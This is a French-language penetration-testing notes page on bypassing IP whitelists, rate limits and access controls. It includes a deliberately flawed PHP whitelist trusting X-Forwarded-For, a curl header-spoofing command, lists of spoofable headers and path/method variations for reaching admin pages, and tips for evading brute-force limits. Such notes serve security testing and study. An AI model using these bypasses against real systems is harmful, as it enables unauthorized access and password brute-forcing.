---
titre: "Information Disclosure — 3 - Bypass"
tags: [Failles, information-disclosure, bypass, rate-limit, ACL]
---

# Information Disclosure — 3. Bypass (rate limit & ACL)

> ⬅ [[Information Disclosure - Index]]

## Bypass de whitelist d'IP / rate limit par headers
Beaucoup d'API font une whitelist d'IP mal codée, basée sur un header **que tu
contrôles** :
```php
$whitelist = array("127.0.0.1", "1.3.3.7");
if(!in_array($_SERVER['HTTP_X_FORWARDED_FOR'], $whitelist)){ header("HTTP/1.1 401"); }
```
→ Bypass : ajouter le header avec une IP whitelistée.
```bash
curl -H "X-Forwarded-For: 127.0.0.1" http://CIBLE/endpoint
```
Variantes à tester (fuzzer chacune) :
```
X-Forwarded-For   X-Forwarded-IP    X-Real-IP        X-Originating-IP
X-Remote-IP       X-Remote-Addr     X-Client-IP      X-Host   X-Custom-IP-Authorization
Forwarded: for=127.0.0.1            Client-IP: 127.0.0.1
# valeurs utiles : 127.0.0.1 · localhost · l'IP interne devinée · 1.3.3.7
```
> 💰 Un des bypass les plus rentables et fréquents en vrai (rate limit, restrictions "admin only from localhost", pages internes).

## Bypass de contrôle d'accès par variation de requête
```
# méthode HTTP
GET /admin  →  POST /admin  /  HEAD  /  OPTIONS
# casse / encodage du chemin
/admin  →  /Admin  /ADMIN  /admin/  /admin/.  /admin%20  /%2e/admin  /admin?x
# double slash / traversal
//admin   /./admin   /admin/..;/   /api/v1/../admin
# extension
/admin  →  /admin.json  /admin.php  /admin;.css
```

## Bypass de rate limit (brute-force)
- Changer l'IP source (header ci-dessus), tourner les User-Agent.
- Casse de l'username (`Admin` vs `admin`) parfois comptée séparément.
- Race condition (envoyer N requêtes en parallèle avant l'incrément du compteur).

> Détection : [[1 - Repérage (Information Disclosure)]] · exploitation : [[2 - Exploitation & techniques (Information Disclosure)]].
